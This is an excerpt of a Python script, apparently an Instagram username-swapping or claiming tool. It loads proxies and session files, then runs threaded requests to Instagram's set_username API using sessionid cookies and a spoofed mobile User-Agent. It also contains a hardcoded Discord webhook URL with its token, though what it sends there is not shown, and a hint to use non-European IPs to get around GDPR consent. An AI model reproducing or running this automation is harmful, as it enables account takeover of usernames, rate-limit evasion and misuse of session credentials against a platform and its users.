...
class swap:
    def __init__(self) :
        ...
        inputc(False,"?",Design.yellow,f"Do You want Swap With Proxy {Design.reda}[Y/n]{Design.WHITE} : ");self.askpr = input()
        Design.clearTermnal() or os.system("cls")
        print(colored(Design.banner,"red"))
        if self.askpr.lower() == "y":
            self.proxies = LoadFile("Proxies","proxies.txt")
        if self.ask.__contains__("y"):
            inputc(False,"?",Design.yellow,f"Do You want Use Multi Session ? {Design.reda}[Y/n]{Design.WHITE} : ");self.ask2 = input()
            if self.ask2.__contains__("y"):
                self.session = LoadFile("Sessions","sessions.txt")
                #inputc(False,"+",Design.green,"Successfully Loded 'sessions.txt' ({len(self.sessions)}) ")
            else:
    ...
    def update_consent(self):
        ...
        if response.__contains__('"status":"ok"'):
            ...
            inputc(False,"-",Design.red,f"Failed to consent to GDPR, use an IP that is not from Europe\n")
            return self.get_info()
    ...
    def get_info(self):
        try:
            ...
            regx_error = re.search(r'"message":"(.*?)",', self.r).group(1)
    ...
    def sent_Discord(self):
        url = "https://discord.com/api/webhooks/908697270042632212/GcdWuOTao8YntZ2nekgmUKuIjavoA4F3ajGSOoOYtpDCKmDGBhBk0CxYjE0bS6OsNoXa" #webhook url, from here: https://i.imgur.com/f9XnAew.png
    ...
    def sent_Discord2(self):
        url = self.Web_hook #webhook url, from here: https://i.imgur.com/f9XnAew.png
    ...
    def set_username(self,sess):
        while self.run:
            future = []
            for i in range(self.Threads):
                futures = self.future_session.post("https://i.instagram.com/api/v1/accounts/set_username/",data={"username":self.Target}, headers={"User-Agent": "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Accept-Language": "en-Us"},cookies={"sessionid": sess})
                futures.i = i
